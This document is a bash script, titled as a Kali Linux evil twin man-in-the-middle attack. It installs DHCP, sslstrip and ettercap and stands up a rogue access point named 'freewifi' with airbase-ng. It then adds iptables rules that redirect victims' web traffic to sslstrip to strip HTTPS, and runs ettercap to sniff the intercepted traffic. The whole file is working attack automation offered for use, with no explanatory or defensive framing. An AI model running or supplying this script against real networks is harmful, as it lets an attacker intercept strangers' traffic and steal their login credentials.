#!/bin/bash

####################################
# Kali linux MiTM evil twin attack #
# Made by: psrcek                  #
# Made on: Sat, 23.1.2016          #
####################################


#Interface config:
in_interface=wlan0
out_interface=eth0

at_interface=at0

#Network config:
network_name="freewifi"

echo "Installing packages..."
apt-get install isc-dhcp-server
apt-get install sslstrip
apt-get install usbutils
apt-get install ettercap-text-only

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Dhcpd segment:"
echo

echo "Writing "$PWD"/dhcpd.conf..."

echo "authoritative;" > dhcpd.conf
echo "default-lease-time 600;" >> dhcpd.conf
echo "max-lease-time 7200;" >> dhcpd.conf
echo "subnet 192.168.2.0 netmask 255.255.255.0 {" >> dhcpd.conf
echo "option routers 192.168.2.1;" >> dhcpd.conf
echo "option subnet-mask 255.255.255.0;" >> dhcpd.conf
echo "option domain-name \"$network_name\";" >> dhcpd.conf
echo "option domain-name-servers 192.168.2.1;" >> dhcpd.conf
echo "range 192.168.2.2 192.168.2.40;" >> dhcpd.conf
echo "}" >> dhcpd.conf

echo
echo "Copying dhcpd.conf to /etc/dhcpd.conf..."
cp dhcpd.conf /etc/dhcpd.conf

echo
echo "Deleting "$PWD"/dhcpd.conf..."
rm dhcpd.conf

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Killing services..."
killall dhclient
killall wpa_supplicant
killall NetworkManager

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Starting airmon-ng on $in_interface..."
airmon-ng start $in_interface

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Starting airbase-ng in new window..."
xfce4-terminal -e "sh -ic \"airbase-ng -c 8 -e $network_name \"$in_interface\"mon\""

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Configuring routes and tables..."
ifconfig $at_interface 192.168.2.1 netmask 255.255.255.0
ifconfig $at_interface mtu 1400
route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.1.1
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface $at_interface -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $out_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Starting dhcp server..."
dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid $at_interface
/etc/init.d/isc-dhcp-server start

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Starting sslstrip in new window..."
xfce4-terminal -e 'sh -ic "sslstrip -f -p -k 10000"'

echo;echo;echo
echo "--------"
echo "- DONE -"
echo "--------"
echo;echo;echo
echo "sleeping for 2 seconds..."; sleep 2

echo "Final step: Starting ettercap..."
ettercap -p -u -T -q -i $at_interface
